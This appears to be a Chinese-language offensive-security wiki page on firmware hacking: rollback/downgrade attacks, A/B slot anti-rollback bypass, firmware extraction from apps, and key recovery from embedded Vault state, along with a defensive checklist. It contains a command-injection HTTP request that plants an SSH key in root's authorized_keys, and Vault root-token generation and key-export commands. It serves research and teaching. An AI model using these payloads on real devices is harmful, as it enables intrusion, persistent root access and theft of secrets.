即使厂商为 firmware images 实现了 cryptographic signature checks，**version rollback（downgrade）保护**也经常被忽略。如果 boot- 或 recovery-loader 只使用内置 public key 验证 signature，却不比较待刷入 image 的 *version*（或 monotonic counter），攻击者就能合法安装**仍带有有效 signature 的旧版、有漏洞的 firmware**，从而重新引入已修复的漏洞。<sup>[[4]](#references)</sup>

典型攻击流程：

1. **获取较旧的签名 image**
   * 从厂商的公开下载门户、CDN 或支持网站获取。
   * 从配套的移动端/桌面应用中提取（例如 Android APK 中的 `assets/firmware/`）。
   * 从 VirusTotal、Internet archives、forums 等第三方仓库获取。
2. 通过任何暴露的 update channel **向设备上传或提供该 image**：
   * Web UI、mobile-app API、USB、TFTP、MQTT 等。
   * 许多消费级 IoT 设备暴露了*无需身份验证*的 HTTP(S) endpoints，可接受 Base64 编码的 firmware blobs，在服务器端解码并触发 recovery/upgrade。
3. 降级后，利用新版中已修复的漏洞（例如后来添加的 command-injection filter）。
4. 可选：在获得 persistence 后，刷回最新 image 或禁用更新，以避免被发现。

### 示例：降级后的 Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

在存在漏洞（已降级）的固件中，`md5` 参数会未经清理直接拼接到 shell 命令中，从而允许注入任意命令（此处用于启用基于 SSH 密钥的 root 访问）。后续固件版本加入了基本的字符过滤器，但由于缺少防降级保护，这项修复形同虚设。<sup>[[4]](#references)</sup>

### 从移动应用中提取固件

许多厂商会将完整的固件映像打包到配套的移动应用中，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些软件包通常以未加密的形式存储在 APK/APEX 的 `assets/fw/` 或 `res/raw/` 等路径下。使用 `apktool`、`ghidra` 甚至普通的 `unzip` 等工具，无需接触实体硬件即可提取已签名的映像。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B 槽位设计中仅在更新器中实现的防回滚绕过

一些厂商确实实现了防降级**递增计数器**，但只将其放在*更新器*逻辑中（例如通过 CAN 执行的 UDS 例程、恢复命令或用户空间 OTA 代理）。如果**bootloader**之后只检查映像签名/CRC，并信任分区表或槽位元数据，那么仍然可以绕过回滚保护。<sup>[[7]](#references)</sup>

典型的薄弱设计：

- 固件元数据同时包含版本描述符和**安全递增计数器** / 单调计数器。
- 更新器将映像的递增计数器与持久存储中的值比较，并拒绝较旧的已签名映像。
- **bootloader**不会解析该递增计数器，在启动选定槽位前只验证标头、CRC 和签名。
- 槽位激活状态单独存储在分区表或每槽位的代数计数器中，且**未与经过验证的确切固件摘要进行加密绑定**。

这会在双槽位系统中产生一种**验证一个映像 / 启动另一个映像**的原语。如果攻击者能让更新器将槽位 B 标记为下一个启动目标（使用当前的已签名映像），并在重启前覆盖槽位 B，那么 bootloader 仍可能启动降级后的映像，因为它只信任已提交的槽位元数据。

常见的滥用模式：

1. 将**当前版本的已签名**固件上传到非活动槽位，并运行常规验证/切换例程，使布局将该槽位标记为下一个活动槽位。
2. **暂时不要重启**。在同一会话中重新进入槽位准备/擦除例程。
3. 利用过期的启动状态或过期的槽位选择逻辑，使更新器擦除刚刚提升的**同一个物理槽位**。
4. 将**较旧但仍已签名**的固件写入该槽位。
5. 跳过强制执行递增计数器的验证例程，直接重启。
6. bootloader 选择已提升的槽位，只验证签名/完整性，然后启动旧映像。

逆向分析 A/B 更新实现时需要留意：

- 槽位选择依赖于**启动时标志**，且成功切换后不会刷新这些标志。
- 类似 `prepare_passive_slot()` 的例程根据过期状态擦除槽位，而不是依据**当前已提交的布局**。
- 类似 `part_write_layout()` 的函数只递增**代数计数器** / 活动标志，而不存储已验证映像的哈希。
- 递增计数器检查只在用户空间或更新器代码中实现，**ROM / bootloader / 安全启动阶段中却没有**。
- 擦除或恢复例程在槽位内容被删除并重写后，仍将该槽位保留为可启动状态。

### 评估更新逻辑的检查清单

* *更新端点*的传输/身份验证是否受到充分保护（TLS + 身份验证）？
* 设备在刷写前是否会比较**版本号**或**单调防回滚计数器**？
* 映像是否在安全启动链中得到验证（例如由 ROM 代码检查签名）？
* **bootloader 是否执行与更新器相同的递增计数器检查**，而非仅检查签名/CRC？
* 槽位激活元数据是否**与已验证固件的摘要/版本绑定**，还是槽位在提升后仍可被修改？
* 槽位切换成功后，设备是否会被强制重启？还是同一会话中仍可调用后续更新/擦除例程？
* 用户空间代码是否执行额外的合理性检查（例如允许的分区映射、型号）？
* *部分更新*或*备份更新*流程是否复用了相同的验证逻辑？

> 💡  如果上述任一项缺失，该平台很可能容易遭受回滚攻击。

## 用于练习的易受攻击固件

要练习发现固件中的漏洞，可以从以下易受攻击的固件项目入手。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 从嵌入式 KMS/Vault 状态中恢复固件解密密钥

当更新映像将少量明文元数据与大型高熵数据块混合在一起时，先进行容器初步分析，再尝试暴力破解：<sup>[[1]](#references)</sup>

- 使用 `hexdump`、`xxd`、`strings -tx`、`base64 -d` 和 `binwalk -E` 转储标头、偏移量和行边界。
- `Salted__` 通常表示 OpenSSL `enc` 格式：接下来的 8 个字节是 salt，其余字节是密文。
- 如果某个 Base64 字段解码后恰好是 `256` 字节，这强烈暗示它是一个 RSA-2048 密文，用于封装随机固件密码/会话密钥。
- 同一文件中的分离式 PGP 材料通常只用于保护真实性；不要假设它用于加密保密。

如果静态密钥搜寻（`grep`、`strings`、PEM/PGP 搜索）无果，不要只搜索私钥，而应逆向分析**实际解密流程**：

- 反编译更新器/管理二进制文件，追踪是谁读取加密数据块、哪个辅助程序/API 对其解封装，以及它请求的逻辑密钥名称。
- 在提取出的根文件系统中搜索 KMS 状态（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`），以及单元文件和 init 脚本。
- 将明文 `vault operator unseal ...`、恢复密钥、引导令牌或本地 KMS 自动解封装脚本视为等同于私钥材料。

如果设备附带原始 Vault 二进制文件和存储后端，重现该环境通常比重新实现 Vault 内部机制更容易：

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

在克隆的 KMS 上以 root 身份操作：

- 仅在隔离的克隆环境中将 transit 密钥设为可导出：`vault write transit/keys/<name>/config exportable=true`
- 导出解包密钥：`vault read transit/export/encryption-key/<name>`
- 使用 KMS 所用的确切填充方式和哈希算法组合测试恢复的 RSA 密钥。PKCS#1 v1.5 解密失败、默认 OAEP 解密失败，**都不能**证明密钥有误；许多由 Vault 支持的流程使用 SHA-256 的 OAEP，而常见库默认使用 SHA-1。
- 如果负载以 `Salted__` 开头，在尝试 AES-CBC 解密前，必须准确复现厂商使用的 OpenSSL KDF（`EVP_BytesToKey`，旧款设备通常使用 MD5）。

这样，“加密固件”就成了一个更普遍的问题：**恢复设备端的运行密钥，然后离线复现准确的解包 + KDF 参数**。

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [使用 Claude 破解固件：资深级技能，初级级自主性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [固件安全测试方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [实战 IoT Hacking：攻击物联网的权威指南](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [利用废弃硬件中的零日漏洞 – Trail of Bits 博客](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [一台 20 美元的智能设备如何让我访问你的家](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [现在你看见 mi：现在你被 Pwn 了](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 从充电端口连接器入手攻击 Tesla Wall Connector - 第 2 部分：绕过防降级机制](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [让它闪烁：通过无线方式攻击 Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [在 QEMU 上 ROOT Tesla OS 第 1 部分：解包](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux 内核文档 - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [在 QEMU 上 ROOT Tesla OS 第 2 部分：调试与修复](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS 密码：弱 XOR 加密可从 SPI Flash 中恢复密码（CVE-2026-40639）](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS 密码恢复工具](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
